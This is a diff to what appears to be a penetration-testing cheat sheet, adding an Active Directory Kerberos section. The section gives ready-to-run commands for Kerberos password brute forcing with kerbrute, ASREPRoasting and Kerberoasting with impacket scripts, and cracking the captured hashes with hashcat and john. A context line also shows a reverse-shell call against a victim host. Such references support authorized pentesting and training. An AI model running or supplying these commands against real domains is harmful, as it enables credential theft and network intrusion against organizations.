@@ -118,6 +118,10 @@
   - [Upload war file via command line](#Upload-war-file-via-commandline)
 - [Active Directory](#Active-Directory)
   - [Kerberos](#Kerberos)
+    - [Kerberoasting](#Kerberoasting)
+    - [ASREPRoast](#ASREPRoast)
+    - [Kerberos brute force](#Kerberos-brute-force)
+    - [Pass the key](Pass-the-key)
 --------------------------------------------------------------------------------------------------------------------------------
 ## Amazon_S3
 
@@ -990,3 +994,54 @@ curl -u '<username>':'<userpassword>' http://<victim_ip>:8080/rev_shell
 # Active Directory
 
 ## Kerberos
+
+### Kerberos brute force
+
+- Tool: https://github.com/TarlogicSecurity/kerbrute
+
+- Usage:
+```
+python kerbrute.py -domain domain.name -users users.txt -passwords passwords.txt -outputfile output_file_name.txt
+```
+### ASREPRoast
+
+- Tool: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
+
+- Usage:
+```
+example 1:
+python GetNPUsers.py domain.name/ -usersfile usernames.txt -format hashcat -outputfile hashes.file
+
+example 2:
+python GetNPUsers.py domain.name/user_name:password -request -format hashcat -outputfile hashes.file
+```
+
+- Cracking AS_REP hash
+
+```
+hashcat -m 18200 --force -a 0 hashes.file rock_you.txt
+```
+
+```
+john --wordlist=rock_you.txt hashes.file
+```
+
+### Kerberoasting
+
+- Tool: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
+
+- Usage:
+```
+python GetUserSPNs.py domain.name/user_name:user_password -outputfile hashes.file
+```
+
+- Cracking TGSs hash
+```
+hashcat -m 13100 --force -a 0 hashes.file rock_you.txt
+```
+
+```
+john --format=krb5tgs --wordlist=rock_you.txt hashes.file
+```
+
+### Pass the key
